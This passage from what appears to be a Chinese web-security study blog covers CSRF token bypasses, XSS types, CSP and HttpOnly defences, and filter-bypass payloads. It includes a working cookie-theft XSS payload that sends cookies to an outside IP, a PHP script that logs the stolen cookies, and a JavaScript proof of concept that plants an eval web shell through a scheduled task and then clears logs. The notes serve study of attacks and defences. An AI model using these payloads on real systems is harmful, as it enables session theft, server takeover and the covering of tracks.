type=&quot;email&quot; name=&quot;email&quot; id=&quot;email&quot; required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>绕过0：规则匹配绕过问题（代码逻辑不严谨）<br>1、<meta name="referrer" content="no-referrer"><br>2、<a href="http://xx.xx.xx.xx/http://xx.xx.xx.xx">http://xx.xx.xx.xx/http://xx.xx.xx.xx</a><br>绕过1：配合文件上传绕过（严谨使用同源绕过）<br>绕过2：配合存储XSS绕过（严谨使用同源绕过）  </p><h2 id="CSRF-Token校验-值删除-复用-留空"><a href="#CSRF-Token校验-值删除-复用-留空" class="headerlink" title="CSRF-Token校验-值删除&amp;复用&amp;留空"></a>CSRF-Token校验-值删除&amp;复用&amp;留空</h2><p><a href="https://blog.csdn.net/weixin_50464560/article/details/120581841">https://blog.csdn.net/weixin_50464560/article/details/120581841</a><br>严谨代码PHP DEMO：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">// 生成并存储 CSRF Token</span><br><span class="line">function generateCSRFToken() &#123;</span><br><span class="line">    $token = bin2hex(random_bytes(32));</span><br><span class="line">    $_SESSION[&#x27;csrf_token&#x27;] = $token;</span><br><span class="line">    return $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 检查 CSRF Token 是否有效</span><br><span class="line">function validateCSRFToken($token) &#123;</span><br><span class="line">    return isset($_SESSION[&#x27;csrf_token&#x27;]) &amp;&amp; $_SESSION[&#x27;csrf_token&#x27;] === $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 处理表单提交</span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">    // 检查 CSRF Token</span><br><span class="line">    if (!isset($_POST[&#x27;csrf_token&#x27;]) || !validateCSRFToken($_POST[&#x27;csrf_token&#x27;])) &#123;</span><br><span class="line">        die(&quot;CSRF Token 验证失败&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取用户输入的数据</span><br><span class="line">    $name = $_POST[&#x27;name&#x27;];</span><br><span class="line">    $email = $_POST[&#x27;email&#x27;];</span><br><span class="line"></span><br><span class="line">    // 输出用户输入的数据</span><br><span class="line">    echo &quot;姓名：$name&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;邮箱：$email&lt;br&gt;&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 生成 CSRF Token</span><br><span class="line">$csrfToken = generateCSRFToken();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSRF Token 示例&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;CSRF Token 示例&lt;/h1&gt;</span><br><span class="line">    &lt;form action=&quot;&lt;?php echo $_SERVER[&#x27;PHP_SELF&#x27;]; ?&gt;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;&lt;?php echo $csrfToken; ?&gt;&quot; /&gt;</span><br><span class="line">        &lt;label for=&quot;name&quot;&gt;姓名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;name&quot; required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;label for=&quot;email&quot;&gt;邮箱：&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;email&quot; name=&quot;email&quot; id=&quot;email&quot; required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>绕过0：将Token参数值复用（代码逻辑不严谨）<br>绕过1：将Token参数删除（代码逻辑不严谨）<br>绕过2：将Token参数值置空（代码逻辑不严谨）  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>55WEB攻防-XSS跨站4</title>
      <link href="/2023/11/08/55WEB%E6%94%BB%E9%98%B2-XSS%E8%B7%A8%E7%AB%994/"/>
      <url>/2023/11/08/55WEB%E6%94%BB%E9%98%B2-XSS%E8%B7%A8%E7%AB%994/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>43、XSS跨站-安全防御-CSP策略</li><li>44、XSS跨站-安全防御-HttpOnly</li><li>45、XSS跨站-安全防御-XSSFilte</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><h2 id="1-CSP-Content-Security-Policy-内容安全策略"><a href="#1-CSP-Content-Security-Policy-内容安全策略" class="headerlink" title="1. CSP (Content Security Policy 内容安全策略)"></a>1. CSP (Content Security Policy 内容安全策略)</h2><p>内容安全策略是一种可信白名单机制，来限制网站中是否可以包含某来源内容。<br>该制度明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单，它的实现和执行全部由浏览器完成，开发者只需提供配置。<br>禁止加载外域代码，防止复杂的攻击逻辑。<br>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。<br>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。<br>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。<br>合理使用上报可以及时发现XSS，利于尽快修复问题。  </p><p>实验：<br>开启CSP时XSS的加载情况<br>未开启CSP时XSS的加载情况<br>绕过：有但鸡肋<br><a href="https://xz.aliyun.com/t/12370">https://xz.aliyun.com/t/12370</a><br><a href="https://blog.csdn.net/a1766855068/article/details/89370320">https://blog.csdn.net/a1766855068/article/details/89370320</a><br>header(“Content-Security-Policy:img-src ‘self’ “);  </p><h2 id="2-HttpOnly"><a href="#2-HttpOnly" class="headerlink" title="2. HttpOnly"></a>2. HttpOnly</h2><p>禁止页面的JavaScript访问带有HttpOnly属性的Cookie。<br>PHP.INI设置或代码引用  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-session.cookie_httponly =1</span><br><span class="line">-ini_set(&quot;session.cookie_httponly&quot;, 1);</span><br><span class="line">-setcookie(&#x27;&#x27;, &#x27;&#x27;, time() + 3600, &#x27;/xss&#x27;, &#x27;&#x27;, false, true);</span><br></pre></td></tr></table></figure><p>实验：<br>开启HttpOnly时XSS窃取Cookie的加载情况<br>未开启HttpOnly时XSS窃取Cookie的加载情况<br>绕过：有但鸡肋<br>(1) CVE-2012-0053<br>(2) PHPINFO页面&#x2F;<br>(3) Flash&#x2F;Java<br><a href="https://blog.csdn.net/weixin_42478365/article/details/116597222">https://blog.csdn.net/weixin_42478365/article/details/116597222</a><br>思路：不获取Cookie采用方式（钓鱼，浏览器攻击框架等）  </p><h2 id="3-XSS-Filter"><a href="#3-XSS-Filter" class="headerlink" title="3. XSS Filter"></a>3. XSS Filter</h2><p>检查用户输入的数据中是否包含特殊字符， 如&lt;、&gt;、’、”,进行实体化等。  </p><p>实验：手工分析&amp;工具分析<br>Xss-Lab 标签及常见过滤绕过<br>环境下载：<a href="https://github.com/Re13orn/xss-lab">https://github.com/Re13orn/xss-lab</a><br>参考资料：<a href="https://xz.aliyun.com/t/4067">https://xz.aliyun.com/t/4067</a><br>工具资料：<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a>  </p><ul><li>1、无任何过滤</li></ul><p><code>&lt;script&gt;alert()&lt;/script&gt;</code></p><ul><li>2、实体化 输入框没有</li></ul><p><code>&quot;&gt;  &lt;script&gt;alert()&lt;/script&gt;  &lt;&quot;</code></p><ul><li>3、全部实体化 利用标签事件 单引号闭合</li></ul><p><code>&#39; onfocus=javascript:alert() &#39;</code></p><ul><li>4、全部实体化 利用标签事件 双引号闭合</li></ul><p><code>&quot; onfocus=javascript:alert() &quot;</code></p><ul><li>5、事件关键字过滤 利用其他标签调用 双引号闭合</li></ul><p><code>&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot;</code></p><ul><li>6、利用大小写未正则匹配</li></ul><p><code>&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot;</code></p><ul><li>7、利用双写绕过匹配</li></ul><p><code>&quot;&gt; &lt;a hrehreff=javasscriptcript:alert()&gt;x&lt;/a&gt; &lt;&quot;</code></p><ul><li>8、利用Unicode编码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0029</span><br></pre></td></tr></table></figure></li><li>9、利用Unicode编码（内容检测）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0029;(&#x27;http://&#x27;)</span><br></pre></td></tr></table></figure></li><li>10、隐藏属性触发闭合</li></ul><p><code>?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</code></p><ul><li>11-20<br><a href="https://blog.csdn.net/l2872253606/article/details/125638898">https://blog.csdn.net/l2872253606/article/details/125638898</a></li></ul><p>黑盒XSS手工分析：<br>1、页面中显示的数据找可控的（有些隐藏的）<br>2、利用可控地方发送JS代码去看执行加载情况<br>3、成功执行即XSS，不能成功就看语句输出的地方显示（过滤）<br>4、根据显示分析为什么不能执行（实体化，符号括起来，关键字被删除等）  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>54WE攻防-XSS跨站3</title>
      <link href="/2023/11/07/54WEB%E6%94%BB%E9%98%B2-XSS%E8%B7%A8%E7%AB%993/"/>
      <url>/2023/11/07/54WEB%E6%94%BB%E9%98%B2-XSS%E8%B7%A8%E7%AB%993/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>39、XSS跨站-攻击利用-凭据盗取</li><li>40、XSS跨站-攻击利用-数据提交</li><li>41、XSS跨站-攻击利用-网络钓鱼</li><li>42、XSS跨站-攻击利用-溯源综合</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>漏洞原理：接受输入数据，输出显示数据后解析执行<br>基础类型：反射(非持续)，存储(持续)，DOM-BASE<br>拓展类型：jquery，mxss，uxss，pdfxss，flashxss，上传xss等<br>常用标签：<a href="https://www.freebuf.com/articles/web/340080.html">https://www.freebuf.com/articles/web/340080.html</a><br>攻击利用：盲打，COOKIE盗取，凭据窃取，页面劫持，网络钓鱼，权限维持等<br>安全修复：字符过滤，实例化编码，http_only，CSP防护，WAF拦截等<br>测试流程：看输出想输入在哪里，更改输入代码看执行（标签，过滤决定）  </p><h2 id="XSS跨站-攻击利用-凭据盗取"><a href="#XSS跨站-攻击利用-凭据盗取" class="headerlink" title="XSS跨站-攻击利用-凭据盗取"></a>XSS跨站-攻击利用-凭据盗取</h2><p>条件：无防护Cookie凭据获取<br>利用：XSS平台或手写接受代码<br>触发：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var url=&#x27;http://47.94.236.117/getcookie.php?u=&#x27;+window.location.href+&#x27;&amp;c=&#x27;+document.cookie;document.write(&quot;&lt;img src=&quot;+url+&quot; /&gt;&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>接受：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url=$_GET[&#x27;u&#x27;];</span><br><span class="line">$cookie=$_GET[&#x27;c&#x27;];</span><br><span class="line">$fp = fopen(&#x27;cookie.txt&#x27;,&quot;a&quot;);</span><br><span class="line">fwrite($fp,$url.&quot;|&quot;.$cookie.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS跨站-攻击利用-数据提交"><a href="#XSS跨站-攻击利用-数据提交" class="headerlink" title="XSS跨站-攻击利用-数据提交"></a>XSS跨站-攻击利用-数据提交</h2><p>条件：熟悉后台业务功能数据包，利用JS写一个模拟提交<br>利用：凭据获取不到或有防护无法利用凭据进入时执行其他  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://xx.xxx.xxx/poc.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function poc()&#123;</span><br><span class="line">  $.get(&#x27;/service/app/tasks.php?type=task_list&#x27;,&#123;&#125;,function(data)&#123;</span><br><span class="line">    var id=data.data[0].ID;</span><br><span class="line">    $.post(&#x27;/service/app/tasks.php?type=exec_task&#x27;,&#123;</span><br><span class="line">      tid:id</span><br><span class="line">    &#125;,function(res2)&#123;</span><br><span class="line">        $.post(&#x27;/service/app/log.php?type=clearlog&#x27;,&#123;</span><br><span class="line">            </span><br><span class="line">        &#125;,function(res3)&#123;&#125;,&quot;json&quot;);</span><br><span class="line">        </span><br><span class="line">      </span><br><span class="line">    &#125;,&quot;json&quot;);</span><br><span class="line">  &#125;,&quot;json&quot;);</span><br><span class="line">&#125;</span><br><span class="line">function save()&#123;</span><br><span class="line">  var data=new Object();</span><br><span class="line">  data.task_id=&quot;&quot;;</span><br><span class="line">  data.title=&quot;test&quot;;</span><br><span class="line">  data.exec_cycle=&quot;1&quot;;</span><br><span class="line">  data.week=&quot;1&quot;;</span><br><span class="line">  data.day=&quot;3&quot;;</span><br><span class="line">  data.hour=&quot;14&quot;;</span><br><span class="line">  data.minute = &quot;20&quot;;</span><br><span class="line">  data.shell=&#x27;echo &quot;&lt;?php @eval($_POST[123]);?&gt;&quot; &gt;C:/xp.cn/www/wwwroot/admin/localhost_80/wwwroot/1.php&#x27;;</span><br><span class="line">  $.post(&#x27;/service/app/tasks.php?type=save_shell&#x27;,data,function(res)&#123;</span><br><span class="line">    poc();</span><br><span class="line">  &#125;,&#x27;json&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">save();</span><br></pre></td></tr></table></figure><h2 id="XSS跨站-攻击利用-网络钓鱼"><a href="#XSS跨站-攻击利用-网络钓鱼" class="headerlink" title="XSS跨站-攻击利用-网络钓鱼"></a>XSS跨站-攻击利用-网络钓鱼</h2><p>1、部署可访问的钓鱼页面并修改<br>2、植入XSS代码等待受害者触发<br>3、将后门及正常文件捆绑打包免杀<br><a href="https://github.com/r00tSe7en/Fake-flash.cn">https://github.com/r00tSe7en/Fake-flash.cn</a>  </p><h2 id="XSS跨站-攻击利用-溯源综合"><a href="#XSS跨站-攻击利用-溯源综合" class="headerlink" title="XSS跨站-攻击利用-溯源综合"></a>XSS跨站-攻击利用-溯源综合</h2><p>1、XSS数据平台-XSSReceiver<br>简单配置即可使用，无需数据库，无需其他组件支持<br>搭建：<a href="https://github.com/epoch99/BlueLotus_XSSReceiver-master">https://github.com/epoch99/BlueLotus_XSSReceiver-master</a><br>2、浏览器控制框架-beef-xss<br>只需执行JS文件，即可实现对当前浏览器的控制，可配合各类手法利用<br>搭建：</p><figure class="highlight docker"><figcaption><span>run --rm -p 3000:3000 janes/beef</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip:<span class="number">3000</span>/ui/panel       u/p:beef/beef</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>53WEB攻防-XSS跨站2</title>
      <link href="/2023/11/06/53WEB%E6%94%BB%E9%98%B2-XSS%E8%B7%A8%E7%AB%992/"/>
      <url>/2023/11/06/53WEB%E6%94%BB%E9%98%B2-XSS%E8%B7%A8%E7%AB%992/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>35、XSS跨站-MXSS&amp;UXSS</li><li>36、XSS跨站-SVG制作&amp;配合上传</li><li>37、XSS跨站-PDF制作&amp;配合上传</li><li>38、XSS跨站-SWF制作&amp;反编译&amp;上传</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><h2 id="MXSS："><a href="#MXSS：" class="headerlink" title="MXSS："></a>MXSS：</h2><p><a href="https://www.fooying.com/the-art-of-xss-1-introduction/">https://www.fooying.com/the-art-of-xss-1-introduction/</a>  </p><h2 id="UXSS："><a href="#UXSS：" class="headerlink" title="UXSS："></a>UXSS：</h2><p>Universal Cross-Site Scripting<br>UXSS是利用浏览器或者浏览器扩展漏洞来制造产生XSS并执行代码的一种攻击类型。<br>MICROSOFT EDGE uXSS CVE-2021-34506<br>Edge浏览器翻译功能导致JS语句被调用执行<br><a href="https://www.bilibili.com/video/BV1fX4y1c7rX">https://www.bilibili.com/video/BV1fX4y1c7rX</a>  </p><h2 id="SVG-XSS"><a href="#SVG-XSS" class="headerlink" title="SVG-XSS"></a>SVG-XSS</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg&#x2F;png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt;&lt;circle cx=&quot;100&quot; cy=&quot;50&quot; r=&quot;40&quot; stroke=&quot;black&quot; stroke-width=&quot;2&quot; fill=&quot;red&quot; /&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><h2 id="PDF-XSS"><a href="#PDF-XSS" class="headerlink" title="PDF-XSS"></a>PDF-XSS</h2><p>1、创建PDF，加入动作JS<br>2、通过文件上传获取直链<br>3、直链地址访问后被触发<br>项目：迅捷PDF编辑器试用版  </p><h2 id="FLASH-XSS"><a href="#FLASH-XSS" class="headerlink" title="FLASH-XSS"></a>FLASH-XSS</h2><ul><li><p>制作swf-xss文件：<br>1、新建swf文件<br>2、F9进入代码区域<br>3、属性发布设置解析  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//取m参数</span><br><span class="line">var m=_root.m;</span><br><span class="line">//调用html中Javascript中的m参数值</span><br><span class="line">flash.external.ExternalInterface.call(m);</span><br></pre></td></tr></table></figure><p>触发：?m&#x3D;alert(&#x2F;xss&#x2F;)<br>项目：Adobe Flash Professional CS6  </p></li><li><p>测试swf文件xss安全性：<br>1、反编译swf文件<br>2、查找触发危险函数<br>3、找可控参数访问触发<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xss一是指执行恶意js，那么为什么说flash xss呢？是因为flash有可以调用js的函数，也就是可以和js通信，因此这些函数如果使用不当就会造成xss。常见的可触发xss的危险函数有：getURL，navigateToURL，ExternalInterface.call，htmlText，loadMovie等等<br>项目：JPEXS Free Flash Decompiler</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>52WEB攻防-XSS跨站1</title>
      <link href="/2023/11/06/52WEB%E6%94%BB%E9%98%B2-XSS%E8%B7%A8%E7%AB%991/"/>
      <url>/2023/11/06/52WEB%E6%94%BB%E9%98%B2-XSS%E8%B7%A8%E7%AB%991/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>33、XSS跨站-输入输出-原理&amp;分类&amp;闭合</li><li>34、XSS跨站-分类测试-反射&amp;存储&amp;DOM</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><p> <img src="/2023/11/06/52WEB%E6%94%BB%E9%98%B2-XSS%E8%B7%A8%E7%AB%991/xss1.png"><br> <img src="/2023/11/06/52WEB%E6%94%BB%E9%98%B2-XSS%E8%B7%A8%E7%AB%991/xss2.png"><br> <img src="/2023/11/06/52WEB%E6%94%BB%E9%98%B2-XSS%E8%B7%A8%E7%AB%991/xss3.png">  </p><h2 id="XSS跨站-输入输出-原理-分类-闭合"><a href="#XSS跨站-输入输出-原理-分类-闭合" class="headerlink" title="XSS跨站-输入输出-原理&amp;分类&amp;闭合"></a>XSS跨站-输入输出-原理&amp;分类&amp;闭合</h2><p>漏洞原理：接受输入数据，输出显示数据后解析执行<br>基础类型：反射(非持续)，存储(持续)，DOM-BASE<br>拓展类型：jquery，mxss，uxss，pdfxss，flashxss，上传xss等<br>常用标签：<a href="https://www.freebuf.com/articles/web/340080.html">https://www.freebuf.com/articles/web/340080.html</a><br>攻击利用：盲打，COOKIE盗取，凭据窃取，页面劫持，网络钓鱼，权限维持等<br>安全修复：字符过滤，实例化编码，http_only，CSP防护，WAF拦截等<br>测试流程：看输出想输入在哪里，更改输入代码看执行（标签，过滤决定）  </p><h2 id="XSS跨站-分类测试-反射-存储-DOM"><a href="#XSS跨站-分类测试-反射-存储-DOM" class="headerlink" title="XSS跨站-分类测试-反射&amp;存储&amp;DOM"></a>XSS跨站-分类测试-反射&amp;存储&amp;DOM</h2><ul><li><p>数据交互的地方<br>  get、post、headers<br>  反馈与浏览<br>  富文本编辑器<br>  各类标签插入和自定义  </p></li><li><p>数据输出的地方<br>  用户资料<br>  数据输出<br>  评论，留言等<br>  关键词、标签、说明<br>  文件上传  </p></li><li><p>反射型XSS：（某案例测试）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;常见情况是攻击者通过构造一个恶意链接的形式，诱导用户传播和打开，<br>由于链接内所携带的参数会回显于页面中或作为页面的处理数据源，最终造成XSS攻击。  </p></li><li><p>存储型XSS：（某案例测试）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;存储型XSS是持久化的XSS攻击方式，将恶意代码存储于服务器端，当其他用户再次访问页面时触发，造成XSS攻击。  </p></li><li><p>DOM-base型XSS：（某案例测试）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过修改原始的客户端代码，受害者浏览器的DOM环境改变，导致有效载荷的执行。页面本身没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面并执行。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
